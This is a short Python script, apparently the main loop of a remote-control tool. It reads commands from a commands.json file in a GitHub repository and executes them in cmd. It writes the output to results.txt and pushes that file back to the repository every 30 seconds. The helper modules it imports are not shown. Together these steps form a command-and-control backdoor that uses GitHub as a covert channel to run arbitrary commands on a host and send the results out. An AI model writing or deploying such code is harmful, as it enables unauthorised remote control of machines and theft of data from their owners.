# Remote controler: Reading and executing remote commands from github into cmd

# Importing packages
from modules.repomanager import readRemoteCommands, writeToRepo
from modules.jsonmanager import executeJSON
from modules.filemanager import makeFile
import time


# Listening to new remote commands on github
def listener():
    while True:
        # Get commands from github repo
        result = executeJSON(readRemoteCommands("commands.json"))
        # Make a file with the given results
        makeFile(result)
        # Write the file to github
        writeToRepo("results.txt")
        # Every 30 seconds program will listen for new commands
        time.sleep(30)
